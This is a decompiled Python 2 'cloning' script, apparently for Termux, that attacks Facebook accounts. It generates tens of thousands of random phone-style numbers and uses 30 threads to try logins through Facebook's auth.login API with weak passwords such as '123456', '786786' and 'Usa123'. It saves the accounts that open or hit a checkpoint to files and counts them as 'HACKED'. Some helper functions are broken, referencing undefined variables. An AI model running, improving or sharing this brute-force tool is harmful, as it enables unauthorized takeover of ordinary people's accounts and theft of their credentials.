# Decompiled By RandiSr
# Github : https://github.com/RANDIOLOY
# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(70000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print (nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('python2 .README.md')
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.02')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


def exb():
    print '[!] Exit Successfully thanku somi'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')

def lodhirt():
    lodhirt = [
     'AM', '   ', 'AM', '  ', 'BRAND BOY\n']
    for o in lodhirt:
        print '\r\x1b[1;94m\x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)
def jalan(x):
	for e in x + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(3.0 / 200)
def tik():
    titik = [
     '   ', 'SOMI  ', 'SOMI BRAND ', 'SOMI BRAND BOY', '100% WORKING,', '  ', '   ']
    for o in titik:
        print '\r\x1b[1;97m \x1b[1;91mPlease\x1b[1;92m Wait\x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)
        


os.system("clear")
logo = """


"""
logo1 = """
\033[1;94m         .__       .__            
  _____ |__|______|  |__ _____   
 /     \|  \_  __ \  |  \\__  \  
|  Y Y  \  ||  | \/   Y  \/ __ \_
|__|_|  /__||__|  |___|  (____  /
      \/               \/     \/ 
\033[1;92m
\033[1;96m
 \033[1;92 
\033[1;91m      
\033[1;94m
\033[1;93m 

\033[1;97m===============================================
\033[1;92m???CREATER   :  Mirha ch
\033[1;96m???WHATAAP : 03455453538???
\033[1;91m???FACEBOOK Mirha ch
\033[1;97m===============================================
\033[1;93m???NOTE Termux Data Clear EveryDay ???
\033[1;97m===============================================
                                                             

"""
logo2 = """
\033[1;91m|
\033[1;92m |         .__       .__            
  _____ |__|______|  |__ _____   
 /     \|  \_  __ \  |  \\__  \  
|  Y Y  \  ||  | \/   Y  \/ __ \_
|__|_|  /__||__|  |___|  (____  /
      \/               \/     \/ 
\033[1;93m | 
\033[1;94m |
 \033[1;95m|
\033[1;96m 
\033[1;92m
                                    

"""
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []
def menu():
    os.system('clear')
    print logo1
    print 47* '\033[1;93m???'
    print
    lodhirt()
    print
    jalan('\x1b[1;92m???\x1b[1;92m1\x1b[1;93m??? \x1b[0;91m????????? START \x1b[0;93mCLONING ???')
    print
    jalan('\033[1;92m???\x1b[1;93m0\x1b[1;93m??? \x1b[0;92m????????? ??? EXIT???')
    print
    print
    print 47* '\033[1;97m???'
    action()


def action():
    global cpb
    global oks
    somi = raw_input('\n\n \x1b[1;94m??? ????????????   ')
    if somi == '':
        print '[!] Fill in correctly'
        action()
    elif somi == '1':
        tik()
        os.system('clear')
        print logo2
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[0;93m TYPE ANY CODE FROM \x1b[0;96m\n555,786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708, 559, 310, 809, 551 :\n ???  ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            somi()                    
    elif somi == '0':            
            login()
    else:
        print '[!] Fill In Correctly'
        action()
        
    print 47* '\033[1;93m???'
    xxx = str(len(id))
    jalan ('\033[1;96m TOTAL IDS NUMBER : '+xxx)
    jalan ('\033[1;92m  JUST 3 CLONING PASSWORD')
    jalan ("\033[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z")
    print 47* '\033[1;93m???'
            
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(Open \x1b[1;96mNow  )  ' + k + c + user + ' ??? ' + pass1                                       
                okb = open('save/successfull.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(Aftar \x1b[1;94m7days) ' + k + c + user + ' ??? ' + pass1
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Open \x1b[1;96mNow)  ' + k + c + user +  ' ??? ' + pass2
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m(Aftar \x1b[1;94m7days) ' + k + c + user + ' ??? ' + pass2
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="Usa123"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Open \x1b[1;96mNow)  ' + k + c + user + ' ??? '+ pass3
                                okb = open('save/successfull.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(Aftar \x1b[1;94m7days) ' + k + c + user + ' ??? ' + pass3 
                                    cps = open('save/checkpoint.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="786786"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(Open \x1b[1;96mNow)  ' + k + c + user + ' ??? ' + pass4 
                                        okb = open('save/successfull.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;92m(Aftar \x1b[1;94m7days) ' + k + c + user + ' ??? ' + pass4
                                            cps = open('save/checkpoint.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="123456"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Open \x1b[1;96mNow)  ' + k + c + user + ' ??? ' + pass5
                                                okb = open('save/successfull.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;92m(Aftar \x1b[1;94m7days) ' + k + c + user + ' ??? ' + pass5 
                                                    cps = open('save/checkpoint.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                          
                                                                                                                                                                                                                    
                                                                                                                                                                                                            


                                                
     
                                                                                                                                                                                                                                                                                                             
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
    print '[\xe2\x9c\x93] \x1b[1;96mTOTAL HACKED/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] \x1b[1;96mCP FILE HAS BEEN SAVED : save/login.txt'
    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
    print 'SOMI BRAND CODING STAR'
    print ''
    print """
    """
    
    raw_input("\n\033[1;92m[\033[1;92mEXIST\033[1;92m]")
    menu() 
          
if __name__ == '__main__':
    menu()


